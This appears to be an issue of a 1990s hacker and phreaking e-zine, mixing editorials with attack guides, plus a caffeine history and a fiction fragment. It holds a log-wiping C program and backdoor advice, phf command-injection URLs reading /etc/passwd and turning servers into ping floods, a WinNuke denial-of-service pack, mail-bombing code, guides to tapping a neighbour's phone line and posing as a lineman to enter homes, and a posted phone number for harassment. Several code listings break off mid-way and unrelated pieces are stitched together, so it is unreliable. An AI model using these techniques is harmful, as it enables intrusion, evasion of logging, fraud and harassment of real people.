[WE HAVE MOVED]
        Hell, most of you probably already know this, but thanks to JP we are
        now at: http://www.antionline.com/hbs/

[ArcAngl Joins HBS]
        Yes, yet another #phreak brother has joined up with HBS. Arc is one
cool mofo, and let knows his shit. He lives kinda near Scud-O, so watch for
halarious anidotes coming from their stories of trashing, getting busted,
drinking, fast driving, etc. Note: Watch out for Acura Integras and Poniac
Grand Prix LE's drag racing!

[Editorial : by Scud-O] Money..........

Money, get away
Get a good job with more pay and you're O.K.
Money it's a gas
Grab that cash with both hands and make a stash
New car, caviar, four star daydream,
Think I'll buy me a football team

Money get back
I'm alright Jack keep your hands off my stack.
Money it's a hit
Don't give me that do goody good bullshit
I'm in the hi-fidelity first class travelling set
And I think I need a Lear jet

Money it's a crime
Share is fairly, but don't take a slice of my pie
Money so they say
Is the root of all evil today
But if you ask for a rise it's no surprise that they're
giving none away.

                - 'Money' by Pink Floyd from 'Dark Side of the Moon'
                                Lyrics by Roger Waters.

        This month, i am going to have a little chat with you on money. Why
you ask? Well, let me blurt it out. Earlier this month, while checking my mail
at the local Post Office, i was approached, and offered a buy out bid for
The HAVOC Technical Journal. Yes, thats right, some one wanted to buy this
very zine that you are reading. Shocked? Well, so was I, especially when i
read the 'contract'.

The 'Contract'
--------------

        Ok, the person who approached me and offered me this money, the amount
of which ill get to in a minute, gave me this contract before heading out the
door.
        It states that one, Scud-O aka __(My REAL Name would go here)___ is
to be paid $10,000 for The HAVOC Technical Journal, Any and all copyrights
held for THTJ, And my current computer.

        Ok, now that sounds like a good deal but read on....

        The restrictions on the editor and writing staff were as follows:

        o I ( Scud-O) can never write or edit another zine, either in print,
          or online, and is far as the rest of this document explained, It
          looked like i could never work and a h/p zine, or even a NORMAL
          zine like Time, Newsweek, etc.

        o Any and all past writers can never write for another zine, either
          in print or online. Now, this is just simply unenforcible, as i have
          no control over the other writers. They will still continue to write
          articles for many zines. I think this was added, so if i had volated
          the contract that they could sue me, and at least be gareented the
          10000 they paid me.


        So, after reading this, well i threw out the contract. There is no way
that i am going to give up THTJ or my freedom to edit a zine, or even write
articles for them. Maybe some of you are saying, 'hey just use a different
nick' , well this would not work, since if the traced the zine to me, which
probably wouldnt be hard to do, They could sue me for breach of contract,
and sue my ass off.
        In the end, i hope you liked the view i took, and decided to keep
THTJ.
                Scud-O , Founder, and Editor in Chief of THTJ


        Scud-O and HBS would like to hear your views on this issue.

[ No We are NOT Going to Stop ]
        Earlier this month, I had mentioned to a few people that i was
thinking of giving up thtj. Well, this is false. I had looked into giving
up on the h/p scene in general, but after a few beers, i changed my mind, I
am going to keep this zine going.
        I would like to thank JP for telling people that i was thinking of
giving up and stop publishing thtj. And a REAL  big thanks to the hundreds of
you who sent me e-mail saying to keep up the good work on the zine. Thanks.

[ crack-passwd.c - A Password Cracker by Scud-O]

        Ok, well, why this may not be the greatest cracker out there, this
has a variety of features, and does more cracking than other conventional
password crackers out there. This is for the UNIX platform, and i have no
intention of porting it to DOS, since well, i dont feel like porting crypt()
along with it.

/*******************************************************************
*
* crack-passwd.c - A Password Cracker by Scud-O for THTJ11.
*
* Usage: crack-passwd [-w wordlist]
*
* This is a fairly advanced cracker, first it gets the GECOS field, and
* modifies it, etc and trys it as the password. if this fails, then it goes
* to the wordlist that you specify, or the /usr/dict/words if you leave it
* blank.
*
* All comments to: Scud-O at <FoxMulder@worldnet.att.net>
*
* Improvements needed : a faster crypt() method would be nice, maybe ill
* try crypt(3), hmmmm. also a faster try() would be nice.
* Also: adding the joetest.c code could be nice, but it's not needed.

************************* | BE PARANOID!

Everyday you see some dumbass wanna be hacker getting arrested, suspended 
from school, kicked out of the house, getting raided by the feds for the
stupid ass reason that the dumb fucker doesnt know how to edit log files!
In this text I am going to explain the varius log files, and where to find
them and how to edit and replace them, using either your greatest hacking
tool yet, that being pico, or use one of the log editor programs.

In this day in age, people use the internet as good ways to access other 
computers. Good idea, but you are also more succeptible to log files. When
you gain root on a dial up there are no log files to be dealt with. The only
true worry is that someone will trace your number back to the original caller.
but that is easily by passed by simply not doing it from your house. Here is
a simple plan for using your neibors phone line to do your deeds (I am lucky
for I have a kid next door who tells everyone hes a hacker so if I ever get
caught its him who gets the blame). 

Ok here we go, on most rural or suburban
neiborhood there are little gray boxes on the sides of the houses, which
are locked by a simple screw that you can unscrew in a matter of seconds.
This little gray box contains usually two phone lines that lead up into 
the house. If the person has two phone lines then the two jacks will be two
different lines, if they have one phoneline then both jacks will be the same
line. Ok, if the person has only one phone line you are good to go. (Make
sure you do this at night or when your neigbors are away on vacation) Dig
a small ditch from your neigbors gray box to your house's nearest window,
then get some long phone cords (Usually found at radio shack) and run it from
the gray box to your nearest phone in your house. Cover up the ditch and you
got yourself a nice phone line to do what you like.

But what if the house has two phonelines and you cant dissconnect one of 
thier lines just for you to use, you may ask. That is right thats just 
screamin for yourself to get caught, so heres what you do!

Go to radio shack and pick up a splitter they kinda look like this
                          ||
                          ---
                         /   \
                        |_____|
I know thats a real lame depiction of the splitter itsself, but uhm what
it does is you can split one line into two lines. So do the same as the one
liner and dig a ditch etc etc, but put the splitter in and lead one line
into your neibors house and the other to your house, so no suspision when
they use their second phone line and the have no dial tone..Also I suggest
you do all your callin on their phone line when they are not home, and dont
try to listen in on their phone calls cuz each time you pick up the phone
thers a really loud click that the other party can hear..Use it just for
doing the stuff you wouldnt dare using your phone line to do.
So when the cops start pullin up, you dont have to worry its all next door.

Now on too unix, and linux. When you do anything on a linux server, you are 
logged. The three main log files you really should worry about are 'lastlog',
'UTMP', and 'WTMP' The only way to edit these files is if you have root 
cuz only root owns these files. Heres a breif description of the 3 important
log files.

   LastLog - Where the last login came from.
   WTMP - every log on and off, with login and logout time plus tty and host. 
   UTMP - Who is currently logged in on the server.

Heres where they can be found on vairus operating sytems.
Usually in linux you can find all the log files in /usr/var/adm
             
LastLog        UTMP      WTMP    | If one of them is in one of those  
-------       ------    ------   | directorys, all the rest tend to be in 
/usr/var/adm  /etc      /etc     | the same direcorys. And dont forget 
/usr/adm      /var/adm  /var/adm | if you used the famed phf exploit 
/var/adm      /usr/var  /usr/var | to get your password file that you 
/var/log      /usr/adm  /usr/adm | cracked, dont forget to erase everything
              /var/log  /var/log | in the /httpd/logs file, in which a lot
                                 | of hackers neglect to do!

Things not to do
----------------
Never, ever, ever, ever totally delete the log files for the fact that
root then knows that there was a hacker in the mists of his system. 

Dont go into /etc/motd and change the motd. Thats the first thing most lame
fuckers do, and thats just another way of screaming 'A HACKER WAS HERE!'
(Why is it when someone acctually gets into a system they feel compled to
tell someone that they were there?)

Dont put in suid root shells anywhere, your better off compiling a backdoor
so you can access it anytime without being noticed by commands like user or
finger..

Dont hack the webpage the server is using, unless you have a pretty damn good
reason to do it and not just to show off to your friends and to try to be 
cool

Some codes to help you along the way
------------------------------------
Marry.c is a great program for editing log files. Lots of flags to play with
and over all its a great fucking program to use to edit and spoof logs.
You can get the source redily at most sites that offer "hacking" codes. Im 
sure alot of people can back me up in saying this is one of the best.
(http://www.rootshell.com is one of the places you can get it)

This next program basicly just erases yourself from all the logs, its simple
but it also screams to the sysadmin that there was a hacker present in the
machine

#include <fcntl.h>
#include <utmp.h>
#include <sys/types.h>
#include <unistd.h>
#include <lastlog.h>

main(argc, argv)
    int     argc;
    char    *argv[];
{
    char    *name;
    struct utmp u;
    struct lastlog l;
    int     fd;
    int     i = 0;
    int     done = 0;
    int     size;

    if (argc != 1) {
         if (argc >= 1 && strcmp(argv[1], "cloakme") == 0) {
             printf("You are now cloaked\n");
             goto start;
                                                           }
         else {
              printf("close successful\n");
              exit(0);
              }
                   }
    else {
         printf("usage: close [file to close]\n");
         exit(1);
         }
start:
    name = (char *)(ttyname(0)+5);
    size = sizeof(struct utmp);

    fd = open("/etc/utmp", O_RDWR);
    if (fd < 0)
        perror("/etc/utmp");
    else {
        while ((read(fd, &u, size) == size) && !done) {
            if (!strcmp(u.ut_line, name)) {
                done = 1;
                memset(&u, 0, size);
                lseek(fd, -1*size, SEEK_CUR);
                write(fd, &u, size);
                close(fd);
            }
        }
    }


    size = sizeof(struct lastlog);
    fd = open("/var/adm/lastlog", O_RDWR);
    if (fd < 0)
        perror("/var/adm/lastlog");
    else {
        lseek(fd, size*getuid(), SEEK_SET);
        read(fd, &l, size);
        l.ll_time = 0;
        strncpy(l.ll_line, "ttyq2 ", 5);
        gethostname(l.ll_host, 16);
        lseek(fd, size*getuid(), SEEK_SET);
        close(fd);
    }
}
 

Now as a concluding paragraph Ive decided to show you why you should be 
paranoid as shit. 
        
        The first and only time I was busted wasnt because I neglected to 
erase log files, or I told eveyone about my doings, it was because there
was a large suspision that I was an alleged "hacker". So because of this
I was not only kicked out of college, I also found out that I was being
watched for 3 weeks including undercover bitches posing as my classmates 
to try to rip out info on me..You can call this discrimination, biased 
thoughts, or whatever you want, but the fact is, no one even likes the term
hacker, the simple word brings up thoughts of some punk teen giving other
people virus's. Much like marijuana legalazation, gay rights, abortion, 
racisim, hacking is a very very touchy subject that our governmetn likes
to brush under the carpet and try to just forget it. But its there, and 
the hackers like codezero (hacking amnesty international) are giving 
the real hackers a bad name, givin the term hacker even more of a 
discriminitory meaning..What Im trying to say here is, be paranoid, dont
talk shit, and look after your own ass.



_____________________________________________________________

Editor's note: Well it seems that some people to read directions and send in
their articles to our submissions editor, keystroke. Thanks to key for passing
this along and to Snapple for writing it. This is a popular topic these days,
so have fun using the code you all.

WinNuke Pack 1.0 by Snapple(root@techie.com)
============================================

Another sloppy piece of Microsoft coding.

It is possible to remotly cause denial of service to any of the operating systems listed below.
by sending Out of Bounds data to NetBios, port 139.The users carrier will drop and cause 
Windows to execute a general protection fault (crash). Obviously you will need an ip address
and the target machine will also need an ip address(ie: inet connection).

Systems that are affected are: 
- Windows 3.11 
- Windows 95 
- Windows NT 3.51 
- Windows NT 4.0 

What the pack contains
======================

- winnuke ansi c source code (linux, bsd, sunos)*
- perl script version of winnuke.*
- Visual C++ version of winnuke (MsWindows platforms).*
- Win95 winnuke binary(winnu95.zip).
- Mac winnuke source (winnuke-10-source.hqx).
- Mac winnuke binary. (WinNuke_1_0_FAT.sit).

* code inserted into article below.

Some Final Words
================
"Download and apply the patches and perhaps you're safe for the next few weeks.
That is, untill the next Microsoft bug surfaces.... This will go on forever. Are you
getting sick and tired of this? Are you fed up with giving your money to Bill Gates -
already the richest man in the world - and getting all this crap in return? Then
perhaps you're ready for an alternative. Perhaps you're ready for Linux. 

Linux is an exciting and powerfull operating system with millions of happy users
world wide. It's the fastest growing operating system in existence. The brightest
minds of the computing world contribute to it. They don't do it for money, they do
it because they want the best system possible. " (quoted)

  MicroType is alittle typing tutor designed for
teaching in the classroom.  I think its real pathetic
because they make it so you can't certain things you
want it to do.  This my help you in your journeys.
  First goto the \mt directory.  Second find a file
called m.xxx  xxx=bat or exe I don't really remember.
Third run it and it should give you a password prompt.
Fourth put in "010" and It will ask you if you want to
change the password or not.  whuala, amaze your friends

[ Linemen Scams ] by phear.



	Well fuck, here we go.  Special thanks to whoever feels like 
publishing this.  After all without information we are all truly lost.
Ever been out beige boxing and thought to yourself, "self, this rules
but there has to be more".. almost as if something was missing? Well
ill tell ya,  its not an overwhelming urge to accept the lord as your
saviour. (so maybe im a little bitter) I was out just doing the usual
beigeboxing the other night and I thought to myself. "Why should I be
forced to this in the dark at night in fear of being caught?" And thats
when i realized i dont have too, in fact neither do you.  

	What better scam then to pretend your a lineman.  Hopefully if
your beigeboxing you know know enough about phones to be a lineman if
not you could wing it if you had too.  So here's what you do.  Go buy
a white hardhat.  Any white hardhat will do,  just as long as it fits
right, I mean why be uncomfortable in the midst of phreaking?  Then 
rummage through your closet ( I know, I know, I would'nt want to go
in there either ) until you find a longsleeve light blue shirt.  Grab
a pair of jeans too.  Alright now, put it all on and look in the mirror.
Believe it or not you will look a whole hell of a lot like a lineman. Or
atleast enough for the general public to be fooled.  Now what your missing
are tools.  No lineman's outfit is complete without tools.

	A utility belt isnt a bad idea but not a necessity, I've never
used one.  You need a red phone, baseless of course.  Preferrably a lineman's
handset, but those aren't always just readily available.  If you want one
bad enough though just swipe one out of a Bell truck.  The important thing
is that whatever phone you have, it's red.  Remember were fooling the general
public here.  You also have got to have a 7/16" hex driver, preferabbly with
a red handle but beggars cant be choosers.  Hell when you swipe the phone 
just swipe the hex driver too.  In fact if you can, take the whole tool belt.
You also need a small flashlight, poor lighting or something, you never 
know.  Alright,  you've got the outfit, tools, and a need to phreak.

	Where to phreak at though?  I mean you dont have a big white truck
with all sorts of compartments in it to make you totally legit.  So you have
to maintain a low profile.  Always pick a spot and then park a block from it
and walk there.  Starting off you should hit a few houses.  Places where 
nobody's home, at work or something.  Just walk up there and open up the 
phonebox,  act like you belong there.  I gaurantee no one will even question
you for a minute.  After you feel pretty confident move on to bigger and
better phreaks.  Go hit a local buisness or two, but go inside and tell them
that you were sent from their phone company, whatever it is and that you are
doing a routine check on the lines because there's been some trouble a few
lines down etcetera.. Then go find the box,  if you want,  ask them to show 
you the phone setup in the building.  This is the best way to get confident
about a scam like this.  Check it all out, pump them for information.  Then
go back to the box and make a few free calls.  If your going to go this far
though you should probably have a lineman's handset.  Looks a lot more 
professional.  Then move on to large apartment complexes.  These are 
especially nice because the lines are always grouped together.  Atleast 
four in each box.

	So now you have your method down and you feel pretty confident. What
can you really do with these new amazing lineman's powers?  Well you know 
that jerk your always pranking?  Now you can go to his house and fuck his
shit up in broad daylight.  In fact go to the door and talk to him about his
phone service for a minute or two.  Ask him if he's been having trouble with
the lines,  so on so forth. Ask him if he minds if you come in for a minute
and have a look at the phone lines in the house.  Walk around and pay 
attention.  You never know what youll see,  potential black mail info, or 
maybe a bill with his ss# on it. Then explain to him that due to maintenance 
purposes your going to have to disconnect his line for an hour or so.  Then
go out to his phone box and do just that.  Then go back up to the house and
tell him that you have an emergency and have to go, but you'll be back in
just a few minutes.  Leave.  Gee, did i forget to hook your shit back up?
Now the next time you call him you can tell him exactly what he looks like
and what his house looks like.  He would probably never suspect the lineman.

	This would probably be the point where you're wondering if this is
all just bullshit or not.  Well, I'll tell ya. Or not. I have done this and
it works.  Just maintain a very cool composure.  Never act nervous or let
the "victim" think you are unsure of yourself.  Never go out any later than
4:00 or so, and don't stay in any one place for more than 20 minutes.  One
more cardinal rule, if you see a real lineman, or a phonetruck, get the fuck
out of there.  As much as I hate to think about it, impersonating a lineman 
is a crime, and so is phone fraud so don't hang around.  The linemen will 
know a fake when they see one.  

	That's it.  The lineman's scam can be pulled off by anyone, but don't
ever forget that it is a scam, and should be done cautiously.  So if your 
just tired of the same old beigebox routine and need a change of pace, just
say fuck it.  Go be a lineman, you'll thank yourself.

[ Java Mail Forging, Bombing, and Other Aspects ] by Scud-O


        Ok, we all know how easy it is to 'forge' e-mail on the internet.
just telnet in to port 25 and use the sendmail commands like MAIL FROM: ,
RCPT TO: , DATA, QUIT, etc to 'forge' mail from a server.
        Of course, this is not really forged mail, since your domain is still
shown in the header for the mail, but since most people these days use either
Netscape mail, or Eudora, which only display the short little header, many
people may think that a mail from thepope@vaticancity.va could be real. Well,
actually if you thought it was real youd have to be real dumb or real drunk.

        }
        catch(IOException e) {}
    }
}

        The applet is very simple in its conception and operation.  The init()
method creates a socket to communicate with port 25 on the applet's home host,
a DataInputStream to read lines of text to the socket, and a PrintStream to
write lines of text to the socket.  Once the applet starts, it uses its
SendMail() method to interact with sendmail.  SendMail() sends a string to
sendmail and returns its response to the applet.  The run() method of PopeMail
then follows the command format given in /etc/mail/sendmail.hf to send its
e-mail letter.


        It is important to understand clearly what happens here.  By viewing
the applet, you are forced to connect to port 25 on the applet's home
host, and you have no choice in the matter.  You need not even be made
aware that this is happening.  The applet controls everything about your
interaction with sendmail: the recipient, the message, and even the return
address supplied to sendmail.  Nevertheless, the e-mail header identifies you
(or at least your machine) as the originator of the message. Of course on a
soundly administered system, careful logging will reveal the applet as the
instigator, so the threat may not be as serious as it seems at first.

        Ok, so this code is pretty much the same, but it adds a for loop for
bombin people. I added in a sample value if 500, but use what you like. The
one pain with this program is that you must edit and compile/run this file
each time you wish to bomb a person. Part of this is because we have more than
enough mail bombing already, But if you want to make this code more versitile,
just add some forms to it for the web applet, or add the code to enter in
different values for toLammah, mailFromPope, and even a file to use for the
message, its your code now, to whatever you fuckin feel like. I dont care.

[How To Turn Your Car Into A Mobile Phreaking Unit] by phear


	Well all right then..  I'd like to start off with a special thanks to 
Havoc Bell and OCPP for putting this in their zine and for having a good zine 
in general (their getting less and less common.)  I'm sure every true phreak 
out there has been wardialing from home lookin' for a couple pbx's or a fax 
or two to plague and thought to themselves,  damn it sure would be a lot 
better if I didn't have to do this from home... what with all the *69's and 
so on.. well I've thought this myself and I decided I was gonna do somethin' 
about it.  That's why I'm writing this article.. how to turn your vehicle.. 
even the most piece of shit car you've ever had.. you know, the one you 
always had to pushroll to start, the one that didn't have reverse or an 
e-brake, into a mobile phreaking unit.  What if you didn't have to wardial 
from home,  what if you simply had to pull your car up and whip out a 50ft. 
phone cable and jack in wherever you pleased.


     You can.. if you are reading this then you have a pc, or are reading it 
on a friends pc and I'm sure through your incredibly persuasive powers of 
coercion you could convince them to try this idea out, in fact just bribe 
them, you'll thank yourself, offer them your sister, free #900 calls, revenge 
etc. Anyway, here's what you need..  A pc with a modem.. any pc will do,  if 
you have to go steal your grandpa's XT and stick a 2400bd in it.  A monitor, 
VGA is nice but not a necessity, the smaller the better.  A power source.

	Now the power source issue is a little more complex,  right now cuz 
I'm short on cash I use an APC Powecell backup for electric in the car.  I 
bought it for my pc a while back cuz UE sucks.  Anyway its good for about 4 
hours and that's plenty.  Any kind of backup will do, as long as you get at 
least an hour out of it, you'll have to find the internal speaker cuz when 
that sucker starts doing backup power its gonna make a real annoying beep,  
so take it apart and desolder the internal speaker and then your set.  Of 
course the best type of power supply, the one I recommend is a line inverter, 
or converter or some shit.  

	Anyway what it does is take the 12vdc from your car and turn it into 
120vac.  The best one I've ever used is made by tripplite and its about $100.
I know, I know a little pricey but  its worth it,  with the car on you will 
never notice a decrease in battery power,  with the car off you could run a 
pc about 3 hours without draining the battery much,  the cheaper line 
inverters may cause some strange small lines on your monitor, which really 
aren't bad just kindave annoying.   


     All right so you've got all your supplies, now your asking yourself what 
the fuck do I do with all this shit.. You've just got to mount it.  I have a 
small black Escort Gt.  If I can fit all this shit in my car then so can you, 
firstly find a good place for the pc itself.  Behind the passenger seat works 
well, unless you have a van, which is truly the ultimate phreaking machine, 
then just slap a desk in the back and grab an extension cord.  As for the 
cars, in most cars the best place to mount the monitor is in the front 
passenger seat wedged in-between the dashboard and the edge of the seat,  
sits at a nice angle so you can see what your doing and it looks real nice.. 
or at least as nice as a monitor wedged into a car can look.  Now if you just 
happen to luck out and find a nice small monitor, like a 10" or an 8" 
then just stash it somewhere... if you have enough room stick it in-between 
the passenger and driver seats. You wanna put the power supply in an easy to 
reach place so you can run all the cords to it without a lot of hassle.  Then 
you need to determine how many people are coming with you on your little 
joyride and tell the other three to go the fuck away you only have room for 
one and he's riding in the back.  Oh yea and if you have an external modem I 
would recommend sticking it in the passenger side by the door in that crevase 
under the seat.  Okay you also need at least 25ft. of your favorite phone 
cord.. just take the one off your girlfriends phone..  So, you've got your 
vehicle all loaded up and your ready to go.. but your not sure exactly how 
best to use  this new found toy.  So I'll tell you about a few of the things 
I've done with mine.  


     Well the first and foremost thing to do is go find a good spot, if your 
gonna use a good size box with a lot of connections then make sure to bring 
your beige box, and if you plan on harassing any of these fools grab your  
favorite touch-tone too.  So me and chaos and his girlfriend (don't ask me 
why I let her go,  I didn't have the room and she bitched about her leg 
cramping the whole time) were out looking for a good spot and found a nice 
dark church, which by the way are really good spots to go most of the time.  
We parked the car on the side opened up the phonebox and just plugged right 
on in.. I had the girlfriend do lookout duty and then dialed 72# 573-xxx-xxxx 
and forwarded everything to my favorite person to harass... which by the way 
if anyone wants to call her is 573-581-7077.. and make sure you say something 
about her mom... anyway .. and since I live in a little shit town people here 
are very guarded about phone harassment so they respond well to hang-ups.  So 
I loaded up my favorite wardialer,  ToneLoc, which is a great wardialer,  but 
I also use THC-Scan from time to time.. I set the call time to 15 sec. to 
allow for a good two rings and set it to dialing,  I called about 80 numbers 
at random with the wardialer.  


	Now this is one of my favorite tricks.. all the people that *69 call 
the forwarded number and never interrupt my dialing...so I figured I'd had my 
fun there and decided to get the hell out of there.. sides, the girlfriend 
had to use the bathroom, and for some reason the bushes just weren't good 
enough ( I can't imagine why ) so off we went, to the gas station, where I 
happened to notice the fax number,  wrote it down when I got to the car, and 
went to another local church, unfortunately it had floodlights.. so I hopped 
out and unscrewed  the bulbs, jacked in and faxed several nasty letters to 
the gas station about how much I really hate the way they look me when I walk 
in there,  just because I have a nosering and don't like my pants to fit so 
tight I have to talk in a high pitched voice is no reason to i.d. me every 
time I want a pack of smokes.   So chaos thought it might not be a bad idea
to give them a call and make sure they got the faxes.


     So he called and told the tubby bitch behind the counter to fuck off and 
enjoy the faxes.. well all right.  That's it.. and remember if you see a cop 
just pretend your lost, most cops are completely pc illiterate and have no 
clue about phreaking either,  so if you cant run then just play dumb.  "Oh no 
officer that's not a pc in my car,  it's part of a new computerized throttle 
control "... or maybe you could try "Well if you weren't so busy eating that 
doughnut maybe you'd know that this is a highly sophisticated state of the 
art mobile phreaking unit used to create chaos in the homes of people just 
like you, and I never would have known about it if it haven't been for Havoc 
Bell and OCPP and this really fucked up article I read written by some guy 
named phear who phreaks with chaos and crypto and somebody else's girlfriend, 
who cant seem to use the bathroom in the bushes."  well that's all.. happy 
mobile phreaking.

***     Securities Hole in cgi-bin
***     memor@mygale.org - http://www.mygale.org/00/memor

***     1 - The really known phf script:

        Mostly the URL victim is really unsecure and the system admin
        doesn't know about cgi-bin security lack.
        And mostly the hackers do that hole in that way : 
        http://www.victim.com/cgi-bin/phf?Qname=a%0acat%20/etc/passwd
        but well, lots of phf are patched and more and more servers
        are now protected and well .. system admins "sometimes" know
        shadowing their passwd file and having login:x: on Query Result
        is not really fear for thoses hackers.
        By the ways.. Http commands (GET mostly) are logged in the
        /www/logs/ directory.. so when u try some hack with phf
        on the navy or some secret services.. hm.. u should use a gateway 
        before..
        Well.. Their is another uses for that script.. personnaly,
        i dont use it for reading the server passwd file due to the 
        reasons i explained before..
        You must remember that %0a escape to command shell (lf) and
        that %20 is the space.
        for example.. im on Efnet IRC and some aol lamer is annoying me
        ... i use a lame weapon for killing him.. a really lame one :
        icmp via phf..
        
        /whois AoLaMer
        *** AoLaMer is ppp125.lamer.aol.com 
        *** AoLaMer is on #Aoltalk
        *** AoLaMer is using irc.primenet.com
        *** AoLaMer is away: Lamer
        *** Notice that i used some lame mirc winblows interface.
        
        [10:01] <AoLaMer> You suck dude, im 3|1+3 cause i use AoL!
        [10:02] <memor> ok man

        i use my favorite netscrupe brownser now and i enter that url:
        http://www.victim.com/cgi-bin/phf?Qname=a%0aping%20-c%201000%20
        -s%205000%20ppp125.lamer.aol.com

        well that command will be translated for the server by 
        (translate %20 in space) a 
        ping -c 1000 -s 5000 ppp125.lamer.aol.com

        the victim server will hit that dude modem with 1000 packets 
        of 5008 bytes.. if he is really lame.. abort the current
        Contacting Server (the netscrupe wont stop to "Contacting Server"
        since the icmp is not completly done) .. so abort it.. The icmp
        will continue during that time.. and do another Query.. so
        another 1000 packets of 5008 bytes.. when i tryed to icmp with
        ping echos > 6008 bytes, the server returned -1.. well : an error.
        
        There is anothers uses.. commands in /bin that www can access
        and u can mkdir write in the www dirs..

        like (...)%20cp%20phf%20.fhp will copy phf to .fhp so the kewl
        root wont see it with a normal ls (-l) but.. hmm beware if he
        uses ls -a .. so u'll be able to call it by a 
        http://www.victim.lame.com/cgi-bin/.fhp after..
        
***     2 - Wrap Script:

        Well i'll be quick on Wrap script ... its a boggus script
        found in irix 6.2 features i know and the use is
        http://www.victim.com/cgi-bin/wrap?../../../etc/passwd
        i know that script allow only a file view.. and well on irix..
        and.. passwd files are sometimes shadowed.
        well i didnt try http://www.victim.com/cgi-bin/wrap?%0als(...)
        so.. i dont know if that script is so boggus.. i should also
        try some buffer overflow.. but same here.. i dont know if it
        works.

***     3 - View-Source Script:

        I was really proud to find that script.. i found it in 
        the florida institute of technology server..
        http://www.fit.edu after they had patched their phf by 
        "rm-ing" it and after having "rm-ed" my fhp and my .fhp  
        and my another .YouSuck ones.. They know the use of ls -a ,
        Wonderfull!! but well.. here view-source was not really
        usefull.. view-source is a "wrap" for Netscape Communicator 2.0
        features. (do a http://www.future.victim.com/cgi-bin/test-cgi)
        and well.. like wrap.. its the same way to access the passwd
        file..
        http://www.new.victim.com/cgi-bin/view-source?../../../etc/passwd
        .. on www.fit.edu their passwd file is shadowed btw.
        i tryed some
        http://www.old.victim.com/cgi-bin/view-source?%1b or %0a ..
        others %20.. but.. no work..
        the only strange thing i saw was on a %0a .. some strange Query
        Results were appearing..
        I tryed a buffer overflow of view-source but it doesnt work.
        
***     4 - php.cgi Script:

        Well i never used php.cgi script but i know that its normally
        like a wrap or a view-source... so the use is 
        http://www.victim.com/cgi-bin/php.cgi?../../../etc/passwd
        well same here.. i did heard it had a was to escape to
        command shell.. but i dont know about it. personnaly
        i use others ways (not httpd ones) for hacking servers.

***     5 - Some uses i did with phf.

        http://www.victim.com/cgi-bin/phf?Qname=a%0aping%20-c%201000%20-s

The History of Caffeine  by Scud-O

NOTE: This was for my chemistry project, which i did publish online. However,
im not giving out the url, since well it kinda reveals who i am, so if you
REALLY want to see the project and all the cool pictures, e-mail me.

Prehistory ( 600,000 - 700,000 years ago )
Most known caffeine-yielding plants were probably discovered
and used during the paleolithic, or Stone Age, times, which
were appoximately 600,000 to 700,000 years ago. The Stone
Age people probably chewed the seeds, bark, and leaves of
many different plants, and the most likely associated the
chewing of certian plants ( the caffeine-yielding ones )
with the resulting changes in mood and behavior.


Eventually, caffeine was cultivated and consumed to banish
fatigue, prolong awakeness, elevate mood, and promote 
concentration.


The Stone Age people may have learned to ground the 
caffeinated plant material into a paste and used it to aid 
in digestion. Much later it was discovered that by adding
the plant into hot and boiling water that a liquid could be
created that when ingested produced even greater effects.
( How else do you think someone would learn to boil something
dark and bitter like a coffee bean? ) The boiled drink 
produced greater effects since more caffeine is extracted
from a plant substance at higher temperatures. This discovery
led to the origin of all caffeine containing beverages,
including coffee, tea, soda, cocoa, kola tea, yoco infusion,
cassina, mate, and guarana.




Tea & It's History
Tea has always been used both as a hot beverage and as
a medicine. Records have indicated that tea drinking may
date back to as far as 4,700 years ago. Tea use ( as well
as many other aspects of Chinese culture ) spread to Japan
around 600 A.D., but it took another 700 years for it to
fully integrate into the Japanese life. During the 17th
century ( 1600 AD ), just as the use of coffee was being
introduced into Europe from Turkey, Dutch traders began
to bring tea into Europe. Despite its initial high cost,
It quickly spread through out Europe, and soon became the 
beverage of choice ( displacing coffee ) in many areas of
Europe.


Tea took a particularly strong hold in North American 
colonies. A tourist visiting the colonies during the
1760s once wrote that American women were "such slaves
to it ( tea ) , that they would rather go without their
dinners than without a dish of tea".


Partly to reaffirm its status as a strong colonial ruler,
( and to collect more revenue ) , in 1767 the British 
government put a special tax on tea and several other items. 
As a result, the colonists boycotted tea and began using
substitutes and alternatives, such as coffee. They also
partook in events like the Boston Tea Party, and either
tossed tea overboard or blew up ships trading tea, or just
plainly denying them the ability to dock. To keep the
revolution up, local doctors and clergy attributed an assortment of
ills and evils to tea drinking.


During this time, most of the worlds's tea came from China,
( and most of it still does ) . Through the East India
Company, the British had almost a total monopoly on the 
tea trade. In 1833, when the company's commerical treaty with
China had expired, British control of the tea trade became
weaker and weaker. After 1833, the British tried cultivating
tea in the Indian subcontinent. However, China tea did not
grow well in India, and the tea plantations of India were only
successful when the local Assam variety of tea was cultivated.
As recently as the 1870s , more than 90% of British tea was
still pouring out of China.


The Insecurity of Britain's hold on the tea trade was not
helped by a domestic tax on tea, which in the early 19th century,
was 15 times higher than the tax on imported coffee. This
resulted in coffee use in Britain which increased tenfold
in the forty years between 1800 and 1840, during which time
coffee over took tea as the drink of choice. After this period
however, several scandals involving coffee led the people
back to tea. After the discovery that several of the larger
coffee importers added such additives as roasted corn,
vegetable roots, and even baked horse liver (!) had been
used to increase the bulk of ground coffee, many buyers
and drinkers were disgusted ( wouldn't you have been disgusted at
that? ) and returned to tea. Also during this scandal, 
perhaps to help people use tea again, the taxes were lowered
on imported tea.





Coffee & It's History
Coffee was first mentioned in an Arabic document from the 10th
century. There is evidence however, which states that
in Ethiopia, coffee was cultivated and the berries chewed
as early as the 6thy century. During the 10th century,
Arabic people crushed the coffee berries, fermented them,
and made a waine called qahwah. Then, in the 11th
century, they began to use the beans to produce a hot drink
from the berries, which they also called qahwah. As the
use of this beverage spread throughout the world, the word
was adpated to the various languages of the coffee drinking
world, producing such words as cafe, Kaffee, koffie, and coffee.
By the end of the 17th century the Dutch had established
coffee plantations on the Indonesian island of Java. ( hence
the famous nickname of coffee, Java ). During the next 50 years,
the first French and then the British followd suit in their
Caribbean colonies. Commercial sultivation of coffee spread from 
the Caribbean to Central and South America, and by the early 19th
century Brazil had supplanted Indonesia as the mojor producer and 
exporter of coffee. By 1860, the US was consuming three quarters of the
world's coffee, more than half of which came from Brazil.

"Why does the ringing not stop? Somebody stop that ringing!" My mind was 
screaming those thoughts, yelling with every ounce of its membrane. "Please 
make it stop... Wait, why is everything so black? Is this normal?"

I suddenly stopped thinking. The ringing had stopped. Feeling nothing, 
thinking nothing; existing was all I could do. Blackness was everywhere. The 
blackness did not surround me, I was not a part of it, but I was not separate 
from it either. Perhaps I was the blackness. No thoughts entered my mind. It 
was not that I couldn't think, not that I was impaired somehow, rather that I 
simply did not think. It was not in my power to think. Thinking is just 
something I do not do; how could I?

The insistent ringing started again.

